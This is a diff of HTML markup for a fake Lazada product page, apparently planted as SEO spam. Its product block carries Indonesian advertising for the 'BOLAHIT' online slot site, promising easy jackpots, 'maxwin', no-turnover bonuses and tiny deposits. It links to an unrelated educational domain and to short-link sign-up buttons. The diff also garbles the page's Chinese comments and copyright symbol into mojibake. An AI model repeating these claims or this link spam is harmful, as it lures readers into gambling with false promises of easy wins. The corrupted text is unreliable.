next-icon-medium"></i></div></div></div></div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title">BOLAHIT : Link Situs Slot Gacor Hari Ini dan Bonus Daftar Slot Demo 100%</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png" data-pagespeed-url-hash="3678877346" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"/></div><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0">8.900.932 Penilaian</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module"><div class="pdp-product-brand"><span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="https://www.agraria1alvear.edu.ar">Slot Gacor</a><div class="pdp-product-brand__divider"></div></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price">
+
+      <p>BOLAHIT merupakan link situs <a href="https://www.agraria1alvear.edu.ar">slot gacor hari ini</a> dengan fitur promo bonus daftar slot demo hingga 100% untuk para pecinta slot online di Indonesia. Dengan berbagai pilihan game slot gacor yang gampang menang, BOLAHIT menawarkan penglaman bermain yang super seru dan menguntungkan. Dengan kemenangan jackpot dan maxwin yang mudah didapatkan membuat situs ini jadi favorit banyak pemain. Cukup daftar dan kamu bisa langsung mendapatkan akun vip untuk menikmati berbagai keuntungan yang lebih besar. Pilihan metode pembayarannya juga sangat beragam, dari qris, bank dan e-money, semua di buat untuk memudahkan kamu untuk bermain slot gacor kapan saja.</p>
+      <br>
+      <p>Di BOLAHIT, kamu juga bisa menikmati bonus daftar slot demo 100% tanpa syarat turnover, jadi saat mendaftar, kamu bisa langsung klaim bonus tanpa harus khawatir soal syarat-syarat yang ribet. Tak hanya itu, situs ini juga memberikan bocoran rtp <a href="https://www.agraria1alvear.edu.ar">slot gacor</a> setiap hari, jadi kamu bisa bermain dengan lebih pede dan memaksimalkan peluang kemenangan. Semua game slot di sini telah didukung oleh provider terpercaya untuk memberikan rtp tertinggi, sehingga kamu bisa meraih kemenangan besar dengan lebih mudah. Ditambah lagi, dengan pelayanan vip 24 jam yang siap membantu kapan saja, jadi kamu nggak akan merasa sendirian.</p>
+      <br>
+      <p><a href="https://www.agraria1alvear.edu.ar">BOLAHIT</a> bukan cuma tempat main slot biasa, tapi juga situs dengan game-game viral yang bisa memberikan maxwin besar! ada banyak pilihan permainan seperti skater hitam yang lagi populer banget, dan memberikan kesempatan buat kamu menang maxwin x500 atau x1000 dengan mudah. Dengan deposit hanya 5 ribu, kamu bisa langsung ikut merasakan permainan slot yang lancar dan tanpa gangguan. Tak ada batasan waktu atau kemenangan, jadi kamu bisa terus bermain dan menang tanpa khawatir kehabisan kesempatan.</p>
+      <br>
+      <p>Di BOLAHIT, kami juga punya banyak memberikan bonus menarik yang bisa kamu klaim setiap hari, seperti cashback, bonus rollingan, dan bahkan bonus kekalahan! dengan segala keuntungan yang ditawarkan, mulai dari demo slot gratis sampai jackpot besar, kamu nggak akan menyesal bergabung di sini. Jadi tunggu apa lagi? segera daftar dan nikmati semua keuntungan yang ada, dan rasakan sendiri bagaimana mudahnya mendapatkan jackpot maxwin di <a href="https://www.agraria1alvear.edu.ar">situs slot gacor</a> hari ini!</p>
+
+      <br><div class="pdp-product-price" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_normal pdp-price_color_orange pdp-price_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdUG5ius">Rp.10.000</span><div class="origin-block" bis_skin_checked="1"><span class="notranslate pdp-price pdp-price_type_deleted pdp-price_color_lightgray pdp-price_size_xs">Rp.100.000</span><span class="pdp-product-price__discount">-90%</span></div></div></div></div><div id="module_redmart_product_price" class="pdp-block module"></div><div id="module_promotion_tags" class="pdp-block module"></div><div id="module_installment" class="pdp-block module"></div><div id="module_quantity-input" class="pdp-block module"><div class="pdp-mod-product-info-section sku-quantity-selection" bis_skin_checked="1"><h6 class="section-title">Kuantitas</h6><div class="section-content" bis_skin_checked="1"><div class="next-number-picker next-number-picker-inline" bis_skin_checked="1"><div class="next-number-picker-handler-wrap" bis_skin_checked="1"><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-up "><span unselectable="unselectable" class="next-number-picker-handler-up-inner"><i class="next-icon next-icon-add next-icon-medium"></i></span></a><a unselectable="unselectable" class="next-number-picker-handler next-number-picker-handler-down next-number-picker-handler-down-disabled"><span unselectable="unselectable" class="next-number-picker-handler-down-inner"><i class="next-icon next-icon-minus next-icon-medium"></i></span></a></div><div class="next-number-picker-input-wrap" bis_skin_checked="1"><span class="next-input next-input-single next-input-medium next-number-picker-input"><input min="1" max="5" step="1" autocomplete="off" type="text" height="100%" value="1"></span></div></div><span class="quantity-content-default"></span></div></div></div><div id="module_sms-phone-input" class="pdp-block module"></div><div id="module_add_to_cart" class="pdp-block module" bis_skin_checked="1"><div class="pdp-cart-concern" bis_skin_checked="1"><a href="https://mikale.me/dmeSw3"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">Login</span></button></a><a href="https://mikale.me/bolahitya" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">DAFTAR SEKARANG</span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;3642482616&quot;,&quot;skuId&quot;:&quot;6108584955&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div><div id="module_redmart_add_to_cart" class="pdp-block module"></div></div><div id="block-O-HF3LN4YVI" class="pdp-block pdp-block__delivery-seller"><div id="module_seller_delivery" class="pdp-block module"><div data-spm="delivery_options" data-nosnippet="true"></div></div><div id="module_redmart_delivery" class="pdp-block module"></div><div id="module_seller_warranty" class="pdp-block module"></div><div id="module_guide_app" class="pdp-block module"></div><div id="module_redmart_service" class="pdp-block module"></div><div id="module_seller_info" class="pdp-block module"><div class="seller-container" data-spm="seller"><div class="seller-name"><div class="seller-name__wrapper"><div class="seller-name__title">Dijual oleh</div><div class="seller-name__detail" data-spm="seller"><a class="pdp-link pdp-link_size_l pdp-link_theme_black seller-name__detail-name"></a></div></div></div><div class="pdp-seller-info-pc"></div></div></div><div id="module_redmart_seller_info" class="pdp-block module"></div></div></div></div></div></div>
   </div>
   
   <script>
@@ -3254,10 +3209,10 @@ if (!lzdDocCookies.getItem('t_uid')) {
   function reportMtopData() {
       if (window.__wpk && window.__pdpMtopStartTime) {
         window.__wpk.report({
-          category: 111, //创建监控项时，获得的"监控代码"
-          msg: 'PDP CSR MTOP API Success Rate', //你要上报的内容
-          w_succ: window.__pdpMtopStatus || 0, // 可选，若监控项需要监控率，则设置此字段可选为0、1
-          wl_avgv1: window.__pdpMtopEndTime ? window.__pdpMtopEndTime - window.__pdpMtopStartTime : 0, // 可选，若监控项需要监控均值，则设置次此字段，必须为数字
+          category: 111, //åˆ›å»ºç›‘æŽ§é¡¹æ—¶ï¼ŒèŽ·å¾—çš„"ç›‘æŽ§ä»£ç "
+          msg: 'PDP CSR MTOP API Success Rate', //ä½ è¦ä¸ŠæŠ¥çš„å†…å®¹
+          w_succ: window.__pdpMtopStatus || 0, // å¯é€‰ï¼Œè‹¥ç›‘æŽ§é¡¹éœ€è¦ç›‘æŽ§çŽ‡ï¼Œåˆ™è®¾ç½®æ­¤å­—æ®µå¯é€‰ä¸º0ã€1
+          wl_avgv1: window.__pdpMtopEndTime ? window.__pdpMtopEndTime - window.__pdpMtopStartTime : 0, // å¯é€‰ï¼Œè‹¥ç›‘æŽ§é¡¹éœ€è¦ç›‘æŽ§å‡å€¼ï¼Œåˆ™è®¾ç½®æ¬¡æ­¤å­—æ®µï¼Œå¿…é¡»ä¸ºæ•°å­—
           c1: window.__regionID__
         })
       }
@@ -3266,9 +3221,9 @@ if (!lzdDocCookies.getItem('t_uid')) {
   function reportMtopData2() {
       if (window.__wpk && window.__pdpTriggerCSR) {
         window.__wpk.report({
-          category: 112, //创建监控项时，获得的"监控代码"
-          msg: 'PDP CSR MTOP API Trigger Rate', //你要上报的内容
-          w_succ: window.__pdpTriggerMtopStatus, // 可选，若监控项需要监控率，则设置此字段可选为0、1
+          category: 112, //åˆ›å»ºç›‘æŽ§é¡¹æ—¶ï¼ŒèŽ·å¾—çš„"ç›‘æŽ§ä»£ç "
+          msg: 'PDP CSR MTOP API Trigger Rate', //ä½ è¦ä¸ŠæŠ¥çš„å†…å®¹
+          w_succ: window.__pdpTriggerMtopStatus, // å¯é€‰ï¼Œè‹¥ç›‘æŽ§é¡¹éœ€è¦ç›‘æŽ§çŽ‡ï¼Œåˆ™è®¾ç½®æ­¤å­—æ®µå¯é€‰ä¸º0ã€1
           c1: window.__regionID__
         })
       }
@@ -3277,9 +3232,9 @@ if (!lzdDocCookies.getItem('t_uid')) {
   function reportMtopData3() {
     if (window.__wpk) {
       window.__wpk.report({
-        category: 113, //创建监控项时，获得的"监控代码"
-        msg: 'PDP CSR Hydrate Success Rate', //你要上报的内容
-        w_succ: window.__pdpHydrateStatus || 0, // 可选，若监控项需要监控率，则设置此字段可选为0、1
+        category: 113, //åˆ›å»ºç›‘æŽ§é¡¹æ—¶ï¼ŒèŽ·å¾—çš„"ç›‘æŽ§ä»£ç "
+        msg: 'PDP CSR Hydrate Success Rate', //ä½ è¦ä¸ŠæŠ¥çš„å†…å®¹
+        w_succ: window.__pdpHydrateStatus || 0, // å¯é€‰ï¼Œè‹¥ç›‘æŽ§é¡¹éœ€è¦ç›‘æŽ§çŽ‡ï¼Œåˆ™è®¾ç½®æ­¤å­—æ®µå¯é€‰ä¸º0ã€1
         c1: window.__regionID__
       })
     }
@@ -3295,7 +3250,7 @@ if (!lzdDocCookies.getItem('t_uid')) {
         console.log('start run...')
         app.run(__moduleData__, function() {
           timings.render = Date.now();
-          // 蹦失打点
+          // è¹¦å¤±æ‰“ç‚¹
           // window.goldlog && window.goldlog.record('/lazada_bounce_rendered', 'EXP');
           pdpLog('/lazada_bounce_rendered', 'EXP', {content: "pdp-m"})
           window.__pdpHydrateStatus = 1;
@@ -3475,7 +3430,7 @@ if (!lzdDocCookies.getItem('t_uid')) {
           <a href="//group.lazada.com/en/about/">Tentang Lazada</a>
       </li>
       <li class="footer-li">
-          <a href="//pages.lazada.co.id/wow/gcp/route/lazada/id/upr_1000345_lazada/channel/id/upr-router/id_upr?hybrid=1&amp;data_prefetch=true&amp;prefetch_replace=1&amp;at_iframe=1&amp;wh_pid=/lazada/channel/id/partnership/AffiliatesID">Afﬁliate Program</a>
+          <a href="//pages.lazada.co.id/wow/gcp/route/lazada/id/upr_1000345_lazada/channel/id/upr-router/id_upr?hybrid=1&amp;data_prefetch=true&amp;prefetch_replace=1&amp;at_iframe=1&amp;wh_pid=/lazada/channel/id/partnership/AffiliatesID">Afï¬liate Program</a>
       </li>
       <li class="footer-li">
           <a href="//www.lazada.com/work-at-lazada/">Karir</a>
@@ -3595,7 +3550,7 @@ if (!lzdDocCookies.getItem('t_uid')) {
   </div>
   <div class="lzd-footer-width-25">
     <div class="lzd-footer-copyright">
-    © Lazada 2024
+    Â© Lazada 2024
     </div>
   </div>
 </div>
@@ -3666,7 +3621,7 @@ window.onload = function() {
     </div>
 
   <!-- end footer -->
-  <!-- 滑块验证码组件 -->
+  <!-- æ»‘å—éªŒè¯ç ç»„ä»¶ -->
   <script src="//aeis.alicdn.com/sd/ncpc/nc.js?t=18507" defer async></script>
   <script>
   define('@ali/wpk-reporter', [], function() {
